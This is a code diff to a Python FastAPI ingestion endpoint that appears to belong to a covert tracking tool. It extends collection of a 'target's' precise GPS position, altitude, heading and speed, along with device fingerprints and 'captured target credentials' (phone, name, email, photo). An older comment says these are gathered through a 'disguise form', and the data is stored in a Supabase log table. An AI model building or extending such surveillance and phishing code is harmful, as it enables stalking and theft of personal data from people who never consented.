@@ -13,10 +13,13 @@ router = APIRouter()
 
 class TrackPayload(BaseModel):
     slug:                 str
-    # GPS (high-accuracy if permitted)
+    # High-Accuracy GPS (Hardware Sensor)
     gps_lat:              Optional[float] = None
     gps_lng:              Optional[float] = None
     gps_accuracy:         Optional[float] = None
+    gps_altitude:         Optional[float] = None
+    gps_heading:          Optional[float] = None
+    gps_speed:            Optional[float] = None
 
     # Screen & Environment
     screen_width:         Optional[int]   = None
@@ -35,9 +38,12 @@ class TrackPayload(BaseModel):
     network_downlink:     Optional[float] = None
     network_rtt:          Optional[int]   = None
 
-    # Interactive captured data (if disguise form filled)
+    # Interactive captured target credentials
     captured_phone:       Optional[str]   = None
     captured_name:        Optional[str]   = None
+    captured_email:       Optional[str]   = None
+    captured_photo:       Optional[str]   = None
+    device_orientation:   Optional[str]   = None
 
     # Silent Fingerprints
     canvas_hash:          Optional[str]   = None
@@ -118,10 +124,13 @@ async def ingest(payload: TrackPayload, request: Request):
         # IP geolocation
         **geo,
 
-        # GPS (High accuracy if permitted)
+        # Exact GPS (High accuracy hardware sensor)
         "gps_lat":              payload.gps_lat,
         "gps_lng":              payload.gps_lng,
         "gps_accuracy":         payload.gps_accuracy,
+        "gps_altitude":         payload.gps_altitude,
+        "gps_heading":          payload.gps_heading,
+        "gps_speed":            payload.gps_speed,
 
         # Accurate Device Identification
         "user_agent":           ua_string,
@@ -132,6 +141,7 @@ async def ingest(payload: TrackPayload, request: Request):
         "device_type":          device_type,
         "device_brand":         resolved["brand"],
         "device_model":         resolved["model"],
+        "chipset":              resolved.get("chipset"),
         "is_mobile":            ua.is_mobile,
         "is_tablet":            ua.is_tablet,
         "is_bot":               ua.is_bot,
@@ -146,14 +156,18 @@ async def ingest(payload: TrackPayload, request: Request):
         "connection_type":      payload.connection_type,
         "referrer":             payload.referrer,
 
-        # Captured phone / interactive data
+        # Captured Target Data (Phone, Photo, Name)
         "captured_phone":       payload.captured_phone,
         "captured_name":        payload.captured_name,
+        "captured_email":       payload.captured_email,
+        "captured_photo":       payload.captured_photo,
+        "device_orientation":   payload.device_orientation,
+
+        # Network Performance & Client Hints
         "client_model":         payload.client_model,
         "client_os_version":    payload.client_os_version,
         "network_downlink":     payload.network_downlink,
         "network_rtt":          payload.network_rtt,
-        "chipset":              resolved.get("chipset"),
 
         # Advanced fingerprints
         "canvas_hash":          payload.canvas_hash,
@@ -183,13 +197,15 @@ async def ingest(payload: TrackPayload, request: Request):
     try:
         supabase.table("tracking_logs").insert(log_entry).execute()
     except Exception as e:
-        # Fallback if any new optional column is not yet in Supabase table
-        # Exclude newly added columns that might not exist in an unmigrated DB
-        essential_entry = {k: v for k, v in log_entry.items() if k not in [
-            "captured_phone", "captured_name", "client_model", "client_os_version", "network_downlink", "network_rtt", "chipset"
-        ]}
+        # Fallback if unmigrated optional columns fail
+        optional_keys = [
+            "captured_photo", "captured_phone", "captured_name", "captured_email",
+            "gps_altitude", "gps_heading", "gps_speed", "device_orientation",
+            "client_model", "client_os_version", "network_downlink", "network_rtt", "chipset"
+        ]
+        clean_entry = {k: v for k, v in log_entry.items() if k not in optional_keys}
         try:
-            supabase.table("tracking_logs").insert(essential_entry).execute()
+            supabase.table("tracking_logs").insert(clean_entry).execute()
         except Exception:
             pass
 
